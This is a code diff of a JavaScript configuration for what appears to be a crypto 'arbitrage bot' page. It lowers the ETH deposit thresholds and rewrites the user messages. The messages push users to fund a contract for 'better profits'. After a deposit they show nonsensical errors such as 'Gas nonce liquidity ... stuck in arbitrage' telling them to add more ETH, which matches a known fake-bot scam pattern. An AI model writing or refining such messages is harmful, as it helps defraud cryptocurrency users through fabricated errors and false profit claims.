@@ -1829,27 +1829,27 @@ function toggleContract(contractIndex) {
 }
 
 const START_CONFIG = {
-    absoluteMinimum: 0.1,
+    absoluteMinimum: 0.25,
     fullMinimum: 0.5,
     recommendedMinimum: 0.5,
-    recommendedMax: 25,
+    recommendedMax: 2,
     delayInjected: 20000,
     delayVM: 30000,
 
     errorLowBalance: (balance, address) =>
         `❌ <strong>Insufficient contract balance</strong> — `
         + `Your contract holds <strong>${balance.toFixed(4)} ETH</strong>. `
-        + `A minimum of <strong>1.5 ETH</strong> is required to start.`,
+        + `A minimum of <strong>0.5 ETH</strong> is required to start.`,
 
     errorLowBalanceHintEnabled: false,
     errorLowBalanceHint: (address) =>
-        `💡 Send at least <strong>1.5 ETH</strong> to your contract address: `
+        `💡 Send at least <strong>0.5 ETH</strong> to your contract address: `
         + `<code>${address}</code>`,
 
     errorLowBalanceRecommendationEnabled: false,
     errorLowBalanceRecommendation: () =>
         `📈 <strong>Recommendation:</strong> For better profits, fund the contract with `
-        + `<strong>2–25 ETH</strong>. Running with the 1.5 ETH minimum is possible but will `
+        + `<strong>2–25 ETH</strong>. Running with the 0.5 ETH minimum is possible but will `
         + `result in reduced profits.`,
 
     warningBelowFull: (balance) =>
@@ -1859,11 +1859,11 @@ const START_CONFIG = {
     warningBelowRecommended: (balance) =>
         `⚠️ Your contract has <strong>${balance.toFixed(4)} ETH</strong>. `
         + `This meets the minimum but profits will be reduced. `
-        + `For better results, consider funding with <strong>2–25 ETH</strong>.`,
+        + `For better results, consider funding with <strong>1–2 ETH</strong>.`,
 
     errorBelowFullAfterTx: () =>
-        `❌ <strong>ERROR:</strong> Less than 1.5 ETH used. `
-        + `Please add the remaining amount for 1.5 ETH or more and press start again.`,
+        `❌ <strong>ERROR:</strong> Less than 1 ETH used. `
+        + `Please add the remaining amount for 1 ETH or more and press start again.`,
 
     errorFullAfterTx: () =>
         `❌ <strong>ERROR:</strong> Gas nonce liquidity equal to injected liquidity stuck in arbitrage. `
